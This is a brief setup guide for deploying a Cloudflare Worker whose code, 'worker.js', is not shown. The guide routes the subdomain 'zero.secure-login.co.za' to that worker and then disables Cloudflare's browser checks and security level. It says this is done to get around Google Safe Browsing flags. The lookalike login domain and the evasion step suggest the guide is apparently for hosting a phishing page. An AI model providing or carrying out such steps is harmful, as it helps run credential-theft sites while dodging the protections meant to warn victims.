Step 1: Deploy the Cloudflare Worker
1. Log into your Cloudflare Dashboard.
2. Go to "Workers & Pages" on the left menu, click "Create Application", and then click "Create Worker".
3. Name it whatever you want and hit "Deploy".
4. Once deployed, click "Edit Code".
5. Delete all the default code in there and copy-paste the exact code from `worker.js`.
6. Click "Save and Deploy".

Step 2: Set up the Domain Route
1. In Cloudflare, go to your domain (`secure-login.co.za`).
2. Go to "DNS" and add an A record:
   - Type: A
   - Name: zero
   - IPv4 address: 192.0.2.1
   - Proxy status: ON (Orange Cloud)
   - Save it.
3. Go to "Workers Routes" (still under your domain settings).
4. Click "Add route".
   - Route: `zero.secure-login.co.za/*`
   - Worker: Select the Worker you just made.
   - Click "Save".
5. Go to "Security" > "WAF" > "Page Rules" and create a rule for `zero.secure-login.co.za/*`.
   - Set "Browser Integrity Check" to OFF.
   - Set "Security Level" to Essentially Off.
   - (This fixes the red flag issue Google Safe Browsing might trigger on your domain).
